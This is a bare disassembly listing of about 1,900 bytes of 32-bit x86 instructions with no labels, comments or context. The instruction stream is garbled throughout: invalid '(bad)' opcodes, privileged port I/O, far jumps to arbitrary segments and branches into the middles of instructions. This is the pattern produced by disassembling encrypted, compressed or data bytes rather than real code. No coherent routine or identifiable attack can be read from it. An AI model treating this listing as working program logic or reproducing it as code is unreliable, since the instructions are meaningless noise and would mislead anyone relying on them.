  41ac6e:	sub    bl,ch
  41ac70:	lea    eax,[ebx-0x15]
  41ac73:	fsubr  DWORD PTR [edi-0x6058eca1]
  41ac79:	je     0x41ac5c
  41ac7b:	test   BYTE PTR [ebp-0x64],0x2c
  41ac7f:	ins    DWORD PTR es:[edi],dx
  41ac80:	mov    ds:0x68cc4da9,eax
  41ac85:	das    
  41ac86:	les    ebp,FWORD PTR [edi]
  41ac88:	sbb    al,0x1b
  41ac8a:	popf   
  41ac8b:	stos   BYTE PTR es:[di],al
  41ac8d:	jmp    0x41acc7
  41ac8f:	aam    0x65
  41ac91:	pop    ss
  41ac92:	xchg   edi,eax
  41ac93:	push   edx
  41ac94:	pop    esp
  41ac95:	mov    eax,ebx
  41ac97:	xor    ecx,DWORD PTR ds:0x8947c296
  41ac9d:	mov    WORD PTR [edi],gs
  41ac9f:	jno    0x41acd9
  41aca1:	stc    
  41aca2:	scas   eax,DWORD PTR es:[edi]
  41aca3:	lahf   
  41aca4:	mov    DWORD PTR [ebx+0x2b],esp
  41aca7:	or     eax,0xa18a8021
  41acac:	mov    dh,0x5b
  41acae:	adc    al,dh
  41acb0:	test   al,0x96
  41acb2:	mul    DWORD PTR [ecx-0x66]
  41acb5:	sub    ah,BYTE PTR [esi+0x6d]
  41acb8:	mov    dh,0x59
  41acba:	(bad)  [esi+0x62fed82c]
  41acc0:	mov    edi,0xc6aaf2d3
  41acc5:	pop    eax
  41acc6:	loopne 0x41ac75
  41acc8:	sub    esp,DWORD PTR [ebx+0x1c6df245]
  41acce:	xchg   ecx,eax
  41accf:	inc    cl
  41acd1:	fimul  DWORD PTR [esp+edi*2+0x256edb8f]
  41acd8:	iret   
  41acd9:	mov    dh,0x96
  41acdb:	clc    
  41acdc:	test   eax,0x29e24709
  41ace1:	shl    dl,1
  41ace3:	push   esp
  41ace4:	push   eax
  41ace5:	call   0xaa57b737
  41acea:	loope  0x41acb8
  41acec:	loop   0x41accf
  41acee:	dec    ecx
  41acef:	cmp    DWORD PTR [ecx-0x60],ecx
  41acf2:	add    DWORD PTR [eax],ebx
  41acf4:	ret    0x24f7
  41acf7:	not    DWORD PTR [ebx-0x7b438706]
  41acfd:	push   esi
  41acfe:	inc    eax
  41acff:	popa   
  41ad00:	jbe    0x41ad1c
  41ad02:	mov    eax,ds:0xa7423c06
  41ad07:	imul   edi,DWORD PTR es:[ecx-0x70],0xffffffee
  41ad0c:	sub    DWORD PTR [ebp-0x78c4d96c],0xf5b8e4f1
  41ad16:	lahf   
  41ad17:	es shl esp,cl
  41ad1a:	inc    esp
  41ad1b:	jb     0x41acc6
  41ad1d:	and    eax,0xd88069d1
  41ad22:	sbb    BYTE PTR [eax-0x797af7c0],dh
  41ad28:	xchg   esi,eax
  41ad29:	dec    ecx
  41ad2a:	xchg   esi,eax
  41ad2b:	or     al,0x1a
  41ad2d:	and    BYTE PTR [edi-0x75b791f],ch
  41ad33:	jno    0x41ad93
  41ad35:	dec    eax
  41ad36:	inc    edi
  41ad37:	xor    al,dl
  41ad39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad3a:	pop    edi
  41ad3b:	mov    di,0xc149
  41ad3f:	mov    ah,0x8
  41ad41:	adc    esi,ebp
  41ad43:	popa   
  41ad44:	jg     0x41ad0c
  41ad46:	shr    DWORD PTR [eax+0x5a2735c7],cl
  41ad4c:	imul   edx,DWORD PTR [edx+0x4a3ce9e6],0x355a4ca5
  41ad56:	cld    
  41ad57:	dec    esp
  41ad58:	adc    eax,0x4bf65469
  41ad5d:	inc    ebp
  41ad5e:	jge    0x41ad55
  41ad60:	cli    
  41ad61:	and    ebx,ecx
  41ad63:	mov    BYTE PTR [ebp+0x8bf6a21],ah
  41ad69:	fwait
  41ad6a:	sbb    al,0x57
  41ad6c:	xor    eax,ecx
  41ad6e:	inc    ebp
  41ad6f:	lock lock push esp
  41ad72:	pop    ds
  41ad73:	in     eax,dx
  41ad74:	cmc    
  41ad75:	push   ecx
  41ad77:	sub    esi,DWORD PTR [ecx]
  41ad79:	or     eax,0x71feef75
  41ad7e:	add    eax,0x781a3e5c
  41ad83:	dec    edx
  41ad84:	adc    al,0xcb
  41ad86:	cli    
  41ad87:	and    dl,BYTE PTR [eax-0x2f5e9e2b]
  41ad8d:	sahf   
  41ad8e:	fbld   TBYTE PTR [edx+0x64]
  41ad91:	stos   BYTE PTR es:[edi],al
  41ad92:	xchg   esi,eax
  41ad93:	popa   
  41ad94:	fucomip st,st(5)
  41ad96:	dec    edx
  41ad97:	mov    dl,0xfe
  41ad99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad9a:	aad    0x2b
  41ad9c:	adc    esp,DWORD PTR [ebx+0x5a23357f]
  41ada2:	fsubp  st(1),st
  41ada4:	jne    0x41ad8a
  41ada6:	in     eax,dx
  41ada7:	cli    
  41ada8:	jp     0x41ae1e
  41adaa:	lods   al,BYTE PTR ds:[esi]
  41adab:	fld    DWORD PTR [esp+ebx*8+0x7]
  41adaf:	dec    ebp
  41adb0:	sbb    cl,BYTE PTR [eax-0x10]
  41adb3:	xchg   edx,eax
  41adb4:	xor    ebx,esi
  41adb6:	aad    0x15
  41adb8:	xor    dh,0x46
  41adbb:	and    eax,0x8be79e77
  41adc0:	add    al,0xe5
  41adc2:	or     eax,0x58735d28
  41adc7:	adc    edx,DWORD PTR [ecx+0x56c90687]
  41adcd:	fmul   st(6),st
  41adcf:	and    bl,BYTE PTR [ecx-0x470c450]
  41add5:	jbe    0x41adba
  41add7:	std    
  41add8:	jae    0x41ae52
  41adda:	and    bh,ah
  41addc:	ins    BYTE PTR es:[edi],dx
  41addd:	dec    ebp
  41adde:	xchg   edi,eax
  41addf:	aaa    
  41ade0:	out    0xea,eax
  41ade2:	iret   
  41ade3:	lods   eax,DWORD PTR ds:[esi]
  41ade4:	dec    ebp
  41ade5:	neg    BYTE PTR [esp+ebp*2+0x7a]
  41ade9:	push   DWORD PTR [ebx]
  41adeb:	sub    ax,dx
  41adee:	shl    DWORD PTR [ebp+0x6dba3d33],cl
  41adf4:	out    0xbb,al
  41adf6:	or     dh,bh
  41adf8:	cli    
  41adf9:	(bad)  
  41adfa:	xchg   ebp,eax
  41adfb:	das    
  41adfc:	mov    dl,0x37
  41adfe:	retf   0xee7c
  41ae01:	sbb    DWORD PTR [eax-0x31ac714d],edi
  41ae07:	fcom   QWORD PTR [edx-0x193f8782]
  41ae0d:	mov    dh,0xab
  41ae0f:	cmp    BYTE PTR [edx+0x478bd8ff],bl
  41ae15:	jle    0x41ae58
  41ae17:	mov    ds:0x4b9cf6ae,al
  41ae1c:	cmc    
  41ae1d:	add    eax,edi
  41ae1f:	pop    esi
  41ae20:	mov    bh,0x81
  41ae22:	jg     0x41ae4d
  41ae24:	gs jecxz 0x41ae96
  41ae27:	(bad)  
  41ae28:	outs   dx,BYTE PTR ds:[esi]
  41ae29:	ja     0x41add7
  41ae2b:	inc    eax
  41ae2c:	or     esi,DWORD PTR ds:0x2582c26
  41ae32:	call   0xfd2e767f
  41ae37:	or     eax,0x6ed7758b
  41ae3c:	mov    ecx,0xf8fc5022
  41ae41:	mul    BYTE PTR ds:0x7b936d4a
  41ae47:	out    0x71,eax
  41ae49:	fdivp  st(1),st
  41ae4b:	jns    0x41ae2e
  41ae4d:	clc    
  41ae4e:	dec    edx
  41ae4f:	xchg   esi,eax
  41ae50:	mov    edi,0x26e093e5
  41ae55:	sub    eax,0xf301186a
  41ae5a:	and    bh,BYTE PTR [esi+0x78]
  41ae5d:	clc    
  41ae5e:	aad    0xac
  41ae60:	aas    
  41ae61:	test   bl,al
  41ae63:	or     esp,ebp
  41ae65:	jmp    0x41ae69
  41ae67:	adc    dh,BYTE PTR [esi+0x66ee6527]
  41ae6d:	add    eax,DWORD PTR [esi+0x26e1bf6e]
  41ae73:	lods   al,BYTE PTR ds:[esi]
  41ae74:	retf   0x5ed3
  41ae77:	fimul  WORD PTR [ecx+0x7d]
  41ae7a:	push   cs
  41ae7b:	adc    bh,BYTE PTR [ebx-0x32]
  41ae7e:	push   0x52
  41ae80:	push   ds
  41ae81:	sbb    BYTE PTR [ecx-0x14],ah
  41ae84:	fcmovnbe st,st(2)
  41ae86:	cli    
  41ae87:	push   ss
  41ae88:	xchg   esp,eax
  41ae89:	add    BYTE PTR ds:0x6cb6633,cl
  41ae8f:	in     al,0x6d
  41ae91:	jnp    0x41aeca
  41ae93:	test   eax,0x61838815
  41ae98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae99:	scas   al,BYTE PTR es:[edi]
  41ae9a:	ret    0x14ef
  41ae9d:	scas   al,BYTE PTR es:[edi]
  41ae9e:	inc    edx
  41ae9f:	xchg   ebx,eax
  41aea0:	push   esp
  41aea1:	adc    al,bl
  41aea3:	pop    es
  41aea4:	arpl   WORD PTR [ecx],bp
  41aea6:	mov    edx,0xf91d8d42
  41aeab:	lods   al,BYTE PTR ds:[esi]
  41aeac:	lea    esp,[esi+0x25fe7e7b]
  41aeb2:	fild   WORD PTR [eax-0x6e923e66]
  41aeb8:	mov    cl,0xcb
  41aeba:	add    edi,ecx
  41aebc:	es jb  0x41aeb0
  41aebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec0:	out    dx,al
  41aec1:	shr    BYTE PTR [ecx],0x5e
  41aec4:	outs   dx,BYTE PTR ds:[esi]
  41aec5:	jp     0x41aed4
  41aec7:	xor    bl,BYTE PTR [edx]
  41aec9:	sbb    dl,dl
  41aecb:	push   ss
  41aecc:	addr16 daa 
  41aece:	nop
  41aecf:	jl     0x41af1c
  41aed1:	rcl    BYTE PTR [edx-0x59],0x8c
  41aed5:	sbb    ebx,DWORD PTR ds:0x340b4608
  41aedb:	mov    ?,WORD PTR [edi-0x6b8d87fe]
  41aee1:	lods   eax,DWORD PTR ds:[esi]
  41aee2:	jg     0x41aecc
  41aee4:	jmp    0x206b:0xa9ce49c8
  41aeeb:	in     eax,dx
  41aeec:	ins    DWORD PTR es:[edi],dx
  41aeed:	cmp    al,0x42
  41aeef:	mov    esi,0x36965cee
  41aef4:	cwde   
  41aef5:	enter  0x3f2d,0x7
  41aef9:	popa   
  41aefa:	int    0x92
  41aefc:	test   al,0xab
  41aefe:	mov    ah,0xbd
  41af00:	push   0xffffffda
  41af02:	xchg   BYTE PTR [ebp-0x5fb3f321],dh
  41af08:	shl    DWORD PTR [ebp-0x5193da04],1
  41af0e:	jns    0x41af12
  41af10:	(bad)  
  41af11:	(bad)  
  41af12:	lock or DWORD PTR [ebx+0x2],ecx
  41af16:	sub    esi,DWORD PTR [ebp+0x25]
  41af19:	sbb    dl,BYTE PTR [eax]
  41af1b:	in     al,dx
  41af1c:	pop    ebp
  41af1d:	sti    
  41af1e:	push   es
  41af1f:	xchg   edx,eax
  41af20:	aam    0x96
  41af22:	cs into 
  41af24:	mov    DWORD PTR [ecx-0x25],0xeddcf15
  41af2b:	jmp    0x41af5e
  41af2d:	dec    edi
  41af2e:	jp     0x41aebd
  41af30:	rcl    DWORD PTR [ebx],1
  41af32:	retf   
  41af33:	bound  edx,QWORD PTR [esi+eiz*1+0x15388519]
  41af3a:	mov    ah,0x94
  41af3c:	add    eax,edx
  41af3e:	das    
  41af3f:	cmp    esi,DWORD PTR [esp+ecx*4-0x2a4bd52f]
  41af46:	dec    edx
  41af47:	sub    edi,DWORD PTR [edx]
  41af49:	test   BYTE PTR [ecx+0x7b640b7d],ch
  41af4f:	mov    ds:0xf85ed2a9,al
  41af54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af55:	xchg   edi,eax
  41af56:	lea    ebp,[esp+eax*2]
  41af59:	sbb    BYTE PTR [edx+0x1f],0x40
  41af5d:	sub    ebx,eax
  41af5f:	(bad)  
  41af60:	imul   ebx,edx,0x3e034137
  41af66:	xor    al,0x4b
  41af68:	addr16 ds inc esp
  41af6b:	sub    eax,0xef9d8a6d
  41af70:	sbb    bl,0x67
  41af73:	mov    BYTE PTR [ebx+ecx*4+0x3c],ah
  41af77:	and    ch,BYTE PTR [edi-0x4481a820]
  41af7d:	add    bl,BYTE PTR [esi-0x3fa28c1d]
  41af83:	xor    BYTE PTR [ebx],bh
  41af85:	lea    esp,[edx-0x522c4923]
  41af8b:	(bad)  
  41af8c:	cmp    edi,DWORD PTR [ebp+0x4b9ce66d]
  41af92:	sbb    DWORD PTR [ebp-0x49],eax
  41af95:	dec    ebx
  41af96:	rcr    DWORD PTR [ebx+eax*2-0x26],0xfc
  41af9b:	and    BYTE PTR ds:0x4e5fcdbb,0xc0
  41afa2:	jp     0x41af66
  41afa4:	pop    ss
  41afa5:	shl    DWORD PTR [eax],1
  41afa7:	fsubr  DWORD PTR [ecx+0x31]
  41afaa:	loop   0x41aff8
  41afac:	in     al,dx
  41afad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afae:	or     edx,DWORD PTR [ecx]
  41afb0:	xor    al,0x63
  41afb2:	pop    ds
  41afb3:	xor    bl,BYTE PTR [esi+0x57]
  41afb6:	jb     0x41af98
  41afb8:	arpl   bx,dx
  41afba:	mov    dh,BYTE PTR [esi+0x11702096]
  41afc0:	aad    0xd6
  41afc2:	idiv   BYTE PTR [eax-0xee93d2e]
  41afc8:	push   ebp
  41afc9:	xor    BYTE PTR [edi],ch
  41afcb:	(bad)
  41afcf:	ret    
  41afd0:	xchg   esp,eax
  41afd1:	fst    DWORD PTR [ebx+0x38]
  41afd4:	jecxz  0x41b033
  41afd6:	sub    ch,ch
  41afd8:	cs js  0x41af82
  41afdb:	xchg   esp,eax
  41afdc:	shr    ah,1
  41afde:	lods   eax,DWORD PTR ds:[esi]
  41afdf:	jbe    0x41afae
  41afe1:	jge    0x41b02f
  41afe3:	inc    edx
  41afe4:	add    DWORD PTR [ecx],ebp
  41afe6:	sbb    eax,DWORD PTR [esi-0x3b]
  41afe9:	ret    
  41afea:	push   0x18
  41afec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afed:	scas   al,BYTE PTR es:[edi]
  41afee:	jo     0x41aff2
  41aff0:	inc    ebp
  41aff1:	inc    edi
  41aff2:	push   ebx
  41aff3:	rcr    DWORD PTR ds:0x24f1bc3b,cl
  41aff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41affa:	test   DWORD PTR [ebx+0x35],esp
  41affd:	add    esp,eax
  41afff:	pop    ds
  41b000:	xchg   BYTE PTR [edx-0x61],bh
  41b003:	jp     0x41b00c
  41b005:	js     0x41afc4
  41b007:	stos   DWORD PTR es:[edi],eax
  41b008:	mov    ebp,0xde034f19
  41b00d:	sbb    ch,BYTE PTR [edi+0x26bbd1b8]
  41b013:	jne    0x41afc5
  41b015:	sub    BYTE PTR [ebx],dh
  41b017:	ja     0x41b078
  41b019:	sub    ecx,DWORD PTR [edx+0x60270739]
  41b01f:	pop    ss
  41b020:	in     eax,dx
  41b021:	mov    esi,0x35ed5a2b
  41b026:	add    eax,0x5d142bd9
  41b02b:	cwde   
  41b02c:	xor    eax,0x2d2bf84c
  41b031:	jns    0x41b02c
  41b033:	inc    esp
  41b034:	cmp    al,0xed
  41b036:	inc    ebp
  41b037:	xchg   BYTE PTR [edi+0x3d],bl
  41b03a:	xor    dh,BYTE PTR [ebx-0x2a031b10]
  41b040:	adc    BYTE PTR [ecx+edx*2+0x7d9c1413],0x9d
  41b048:	mov    edi,0x8ab2720b
  41b04d:	fwait
  41b04e:	pusha  
  41b04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b050:	add    DWORD PTR [ecx+0x23],esi
  41b053:	cmp    DWORD PTR [esi-0x36ac2b3e],ecx
  41b059:	pusha  
  41b05a:	sbb    eax,0x26ea4c9d
  41b05f:	ror    ch,1
  41b061:	dec    esp
  41b062:	jle    0x41b01b
  41b064:	sti    
  41b065:	and    dl,BYTE PTR [ebp+0xc14eb7e]
  41b06b:	inc    eax
  41b06c:	and    al,0xdc
  41b06e:	add    BYTE PTR [edi+0x2a],cl
  41b071:	aad    0xf7
  41b073:	or     bh,BYTE PTR [edi+0x3108a911]
  41b079:	mov    ds:0x8455087f,al
  41b07e:	pushf  
  41b07f:	push   esi
  41b080:	cmp    esp,DWORD PTR [edx+0x23a97496]
  41b086:	xchg   ebp,eax
  41b087:	aaa    
  41b088:	jp     0x41b0bc
  41b08a:	js     0x41b031
  41b08c:	sub    al,0x9
  41b08e:	xchg   ecx,eax
  41b08f:	enter  0xaed3,0xeb
  41b093:	lahf   
  41b094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b095:	imul   edx,DWORD PTR ds:0x76bdb562,0x64
  41b09c:	mov    ebx,0xde118047
  41b0a1:	in     eax,0xdf
  41b0a3:	mov    al,0x1f
  41b0a5:	std    
  41b0a6:	cmp    dh,BYTE PTR ds:0xc55535d4
  41b0ac:	adc    DWORD PTR [esi-0x1300319c],0x4224f967
  41b0b6:	scas   eax,DWORD PTR es:[edi]
  41b0b7:	and    ah,BYTE PTR [ecx-0x4]
  41b0ba:	aas    
  41b0bb:	jno    0x41b062
  41b0bd:	xor    bh,BYTE PTR [edx+0x75758e6e]
  41b0c3:	cmp    dl,cl
  41b0c5:	pop    edi
  41b0c6:	mov    bh,0x2
  41b0c8:	inc    ebx
  41b0c9:	(bad)
  41b0cc:	aas    
  41b0cd:	mov    es,WORD PTR [eax+0x3e]
  41b0d0:	xchg   esp,eax
  41b0d1:	inc    ebx
  41b0d2:	jbe    0x41b14c
  41b0d4:	imul   edx,DWORD PTR [ecx],0x30
  41b0d7:	je     0x41b088
  41b0d9:	jmp    0x4bc6:0xab7dc8d
  41b0e0:	jbe    0x41b09a
  41b0e2:	daa    
  41b0e3:	jmp    0x6c58d99
  41b0e8:	adc    bh,al
  41b0ea:	ss mov edx,0xa7cb40bf
  41b0f0:	push   0x4d
  41b0f2:	xchg   edi,eax
  41b0f3:	inc    ecx
  41b0f4:	sub    al,0x27
  41b0f6:	jns    0x41b0f1
  41b0f8:	push   0x4901a868
  41b0fd:	ret    0xe102
  41b100:	int3   
  41b101:	call   0x4f30:0xd01ed570
  41b108:	out    dx,al
  41b109:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b10b:	popf   
  41b10c:	fadd   DWORD PTR [edi+0x4c29003b]
  41b112:	leave  
  41b113:	jp     0x41b099
  41b115:	add    BYTE PTR [ecx-0x4050dc7d],0xf9
  41b11c:	xchg   ecx,eax
  41b11d:	and    BYTE PTR [esi],0xaf
  41b120:	mov    ebx,0xec4acae
  41b125:	daa    
  41b126:	(bad)  
  41b127:	repnz idiv DWORD PTR [esp+edx*1+0x270a8906]
  41b12f:	dec    ecx
  41b130:	inc    ecx
  41b131:	pushf  
  41b132:	fs push edx
  41b134:	mov    al,0x8
  41b136:	adc    BYTE PTR [ebp+0x39],al
  41b139:	mov    ebp,0x45d4b442
  41b13e:	pop    es
  41b13f:	mov    ah,0xf0
  41b141:	(bad)  
  41b142:	jmp    0x94ac:0xf12f6c5
  41b149:	cmp    ch,BYTE PTR [ebx-0x2d656906]
  41b14f:	shr    BYTE PTR [edi-0x40e0dbed],0xd2
  41b156:	fbstp  TBYTE PTR [esi+eiz*2+0x7a3697e4]
  41b15d:	pop    edi
  41b15e:	inc    ebp
  41b15f:	or     al,0x88
  41b161:	ss js  0x41b1a9
  41b164:	test   eax,0x674dda8b
  41b169:	sbb    cl,BYTE PTR [ebp+esi*1+0x3e]
  41b16d:	adc    edx,DWORD PTR [edx-0x6fb6023e]
  41b173:	pop    esi
  41b174:	jecxz  0x41b1aa
  41b176:	in     al,dx
  41b177:	repnz stos DWORD PTR es:[edi],eax
  41b179:	xor    BYTE PTR [edx],0xdd
  41b17c:	mov    ebp,0x1c3b288a
  41b181:	mov    ds:0xc012b3ba,eax
  41b186:	push   ecx
  41b187:	in     eax,0x1d
  41b189:	cmp    DWORD PTR [esi+0x7f477084],eax
  41b18f:	(bad)  
  41b190:	jmp    0x41b1f0
  41b192:	rol    BYTE PTR [ecx],0x81
  41b195:	ror    esp,1
  41b197:	jl     0x1999b3bd
  41b19d:	mov    ds:0xf562a12e,eax
  41b1a2:	ror    BYTE PTR [edi+eiz*4],1
  41b1a5:	aad    0xb5
  41b1a7:	test   eax,0x6917fb2d
  41b1ac:	pop    ecx
  41b1ad:	pop    ss
  41b1ae:	xchg   edi,eax
  41b1af:	ins    DWORD PTR es:[edi],dx
  41b1b0:	mov    esp,0x8f035f59
  41b1b5:	cld    
  41b1b6:	xor    eax,DWORD PTR [edi-0x154cff5]
  41b1bc:	lods   eax,DWORD PTR ds:[esi]
  41b1bd:	pop    eax
  41b1be:	and    eax,ebp
  41b1c0:	out    0xf4,al
  41b1c2:	arpl   di,di
  41b1c4:	mov    dl,0x2c
  41b1c6:	add    BYTE PTR [esi+0x5a6de91c],al
  41b1cc:	loope  0x41b200
  41b1ce:	mov    edx,0xaa11e631
  41b1d3:	cdq    
  41b1d4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41b1d6:	inc    ebx
  41b1d7:	cmp    al,0x59
  41b1d9:	fisttp WORD PTR [ebp-0x5d]
  41b1dc:	popa   
  41b1dd:	dec    edi
  41b1de:	scas   eax,DWORD PTR es:[edi]
  41b1df:	jne    0x41b16e
  41b1e1:	push   0xffffffb1
  41b1e3:	pop    ebx
  41b1e4:	sub    eax,0x53551f93
  41b1e9:	in     al,0x9e
  41b1eb:	cmp    dh,BYTE PTR [edi+ebp*1-0x67]
  41b1ef:	loopne 0x41b230
  41b1f1:	imul   esp,DWORD PTR [ecx-0x65],0x34
  41b1f5:	sub    edx,ecx
  41b1f7:	ror    DWORD PTR [ebx+0x498dd2d5],0xc3
  41b1fe:	push   ss
  41b1ff:	(bad)  
  41b200:	xchg   edx,eax
  41b201:	pop    edi
  41b202:	cdq    
  41b203:	add    al,0x74
  41b205:	adc    eax,0x7edb79e3
  41b20a:	xlat   BYTE PTR ds:[ebx]
  41b20b:	test   al,ah
  41b20d:	lock xchg ebx,eax
  41b20f:	pop    edi
  41b210:	test   BYTE PTR [ecx+ecx*2],al
  41b213:	adc    ch,BYTE PTR [ebp+0x18]
  41b216:	sar    edi,1
  41b218:	mov    cl,0x0
  41b21a:	sbb    DWORD PTR [ebp+eax*2+0x8],esp
  41b21e:	dec    eax
  41b21f:	loopne 0x41b217
  41b221:	test   DWORD PTR [edi+ebp*4],ebp
  41b224:	ss jb  0x41b294
  41b227:	dec    ecx
  41b228:	xor    DWORD PTR [edi+ebp*4-0xb],edi
  41b22c:	fild   WORD PTR [ebp-0x371b6081]
  41b232:	(bad)
  41b235:	cmp    al,0x4c
  41b237:	xchg   DWORD PTR [ecx],edx
  41b239:	mov    ds:0x2ccef7e2,al
  41b23e:	(bad)  
  41b23f:	int    0xaf
  41b241:	pop    edx
  41b242:	imul   ebp,DWORD PTR [ecx+0x5345cef9],0xffffffaa
  41b249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b24a:	pop    eax
  41b24b:	mov    ebp,0x59a6b3b5
  41b250:	cmp    BYTE PTR [eax-0x6525ade8],bl
  41b256:	pop    ss
  41b257:	add    ebx,edi
  41b259:	es push ebx
  41b25b:	dec    edx
  41b25c:	fstp   TBYTE PTR [esi-0x7]
  41b25f:	fiadd  WORD PTR [ebp+0x1181a54e]
  41b265:	cmp    BYTE PTR [ebp+0x75],cl
  41b268:	xlat   BYTE PTR ds:[ebx]
  41b269:	dec    ebx
  41b26a:	icebp  
  41b26b:	cmp    eax,0xb619206d
  41b270:	adc    al,0xd3
  41b272:	cdq    
  41b273:	pop    esp
  41b274:	add    BYTE PTR [edi+0x63],dl
  41b277:	gs xor bl,dl
  41b27a:	xchg   BYTE PTR [ecx+0x12],cl
  41b27d:	dec    edx
  41b27e:	jae    0x41b244
  41b280:	pop    ss
  41b281:	cwde   
  41b282:	aad    0x10
  41b284:	popf   
  41b285:	jmp    0x41b21a
  41b287:	into   
  41b288:	retf   
  41b289:	adc    DWORD PTR [edx-0x66],esi
  41b28c:	cdq    
  41b28d:	cmp    bh,ch
  41b28f:	or     BYTE PTR [ecx-0x13e5c9a],dl
  41b295:	mov    bh,0x51
  41b297:	scas   al,BYTE PTR es:[edi]
  41b298:	das    
  41b299:	rcr    edi,cl
  41b29b:	mov    cl,0xc8
  41b29d:	cmp    esi,eax
  41b29f:	scas   al,BYTE PTR es:[edi]
  41b2a0:	test   DWORD PTR [ecx],edx
  41b2a2:	aas    
  41b2a3:	jmp    0x41b2ed
  41b2a5:	cmp    eax,0x1a6a9d17
  41b2aa:	mov    cl,0x68
  41b2ac:	or     eax,0xe0591b46
  41b2b1:	test   al,0xe
  41b2b3:	outs   dx,BYTE PTR ds:[esi]
  41b2b4:	scas   eax,DWORD PTR es:[edi]
  41b2b5:	inc    edi
  41b2b6:	jp     0x41b27e
  41b2b8:	xchg   ebx,eax
  41b2b9:	inc    esp
  41b2ba:	mov    ebp,0xadec8da0
  41b2bf:	fist   WORD PTR [ebp+0x2a]
  41b2c2:	mov    eax,ds:0x8745e11e
  41b2c7:	add    ebx,esp
  41b2c9:	jne    0x41b25b
  41b2cb:	repnz push edx
  41b2cd:	inc    ecx
  41b2ce:	(bad)  
  41b2cf:	push   ds
  41b2d0:	pop    edx
  41b2d1:	mov    WORD PTR [edi],es
  41b2d3:	fdiv   st,st(6)
  41b2d5:	mov    esp,0xcfa4b532
  41b2da:	nop
  41b2db:	popa   
  41b2dc:	mov    gs,WORD PTR [edx+esi*2+0x990497a]
  41b2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e4:	scas   eax,DWORD PTR es:[edi]
  41b2e5:	mov    cl,0xd8
  41b2e7:	int    0xc5
  41b2e9:	jne    0x41b356
  41b2eb:	cdq    
  41b2ec:	fnstsw WORD PTR [ebx+0x436d330]
  41b2f2:	cld    
  41b2f3:	xchg   edi,eax
  41b2f4:	imul   edx,DWORD PTR [edi],0xebb6c5f9
  41b2fa:	bound  ebx,QWORD PTR [ebp+0x58b1f036]
  41b300:	sti    
  41b301:	sub    WORD PTR ds:0x91e3ea05,di
  41b308:	loopne 0x41b304
  41b30a:	jb     0x41b35e
  41b30c:	bound  eax,QWORD PTR [eax-0x32677146]
  41b312:	jnp    0x41b2df
  41b314:	aaa    
  41b315:	mov    ds:0x2222e826,eax
  41b31a:	(bad)  
  41b31b:	iret   
  41b31c:	mov    al,ds:0xcbe52b1e
  41b321:	fstp   st(0)
  41b323:	dec    DWORD PTR [edx+0x1b885a95]
  41b329:	mov    al,BYTE PTR [edx]
  41b32b:	dec    ebx
  41b32c:	ds pop edi
  41b32e:	or     eax,0x4ae4960d
  41b333:	xchg   DWORD PTR [ecx+ebx*2],ebp
  41b336:	sbb    eax,DWORD PTR [eax]
  41b338:	xchg   edi,eax
  41b339:	fcomp  QWORD PTR [esi]
  41b33b:	mov    cl,0xf9
  41b33d:	jns    0x41b399
  41b33f:	or     eax,0x23a7e00a
  41b344:	out    dx,al
  41b345:	inc    ecx
  41b346:	rcr    DWORD PTR [edx-0x2e],1
  41b349:	imul   edx,DWORD PTR [edi-0x401dd448],0xffffffd8
  41b350:	or     eax,0xff33575b
  41b355:	pop    ebx
  41b356:	rcl    DWORD PTR [ebp+0x29],1
  41b359:	mov    bh,BYTE PTR [ebx-0x4dcb0d85]
  41b35f:	lock add dh,BYTE PTR [esi+edi*8-0x49]
  41b364:	inc    edx
  41b365:	add    BYTE PTR [eax],al
  41b367:	aad    0x2b
  41b369:	mov    ah,0x4f
  41b36b:	xor    esi,DWORD PTR [ebp-0xddf665b]
  41b371:	jl     0x41b37c
  41b373:	jg     0x41b3ef
  41b375:	inc    esp
  41b376:	xor    eax,0x7720bc5a
  41b37b:	mov    ebp,0x3d08964f
  41b380:	xor    ch,BYTE PTR [edi]
  41b382:	push   0x8
  41b384:	sahf   
  41b385:	lea    eax,[eax-0x26]
  41b388:	dec    esi
  41b389:	jecxz  0x41b3ef
  41b38b:	jo     0x41b3fa
  41b38d:	pop    esp
  41b38e:	scas   al,BYTE PTR es:[edi]
  41b38f:	xlat   BYTE PTR ds:[ebx]
  41b390:	sti    
  41b391:	scas   eax,DWORD PTR es:[edi]
  41b392:	xor    al,0x4e
  41b394:	ud0    ebx,DWORD PTR [ebx+0x7c3b524c]
  41b39b:	imul   eax,DWORD PTR [esi],0x678c75d1
  41b3a1:	xchg   ebx,eax
  41b3a2:	aad    0x84
  41b3a4:	mov    edx,0xd23ad5a3
  41b3a9:	aas    
  41b3aa:	dec    esp
  41b3ab:	xchg   edx,esp
  41b3ad:	nop
  41b3ae:	pop    ds
  41b3af:	sbb    eax,ebx
  41b3b1:	shl    DWORD PTR [ebx-0x1bfda00d],0x27
  41b3b8:	jp     0x41b3a2
  41b3ba:	stos   DWORD PTR es:[edi],eax
  41b3bb:	shr    ch,cl
  41b3bd:	mov    bl,0xa2
  41b3bf:	pop    eax
  41b3c0:	or     edi,DWORD PTR [eax+0xccb4068]
  41b3c6:	jo     0x41b438
  41b3c8:	fmul   QWORD PTR [esp+ebp*4]
  41b3cb:	cmp    DWORD PTR [ecx-0x5a744029],esp
  41b3d1:	mov    ah,bh
  41b3d3:	aam    0x87
  41b3d5:	popf   
  41b3d6:	xchg   esp,eax
  41b3d7:	cmp    al,0x3d
  41b3d9:	and    al,0xcd
  41b3db:	inc    ecx
  41b3dc:	pop    edx
  41b3dd:	nop
  41b3de:	xor    BYTE PTR [esi-0x5b],0x58
  41b3e2:	int    0xcb
  41b3e4:	not    DWORD PTR [ebp-0x6777374e]
  41b3ea:	jmp    0x9f4c:0xcd45fb4
  41b3f1:	push   0xffffffd2
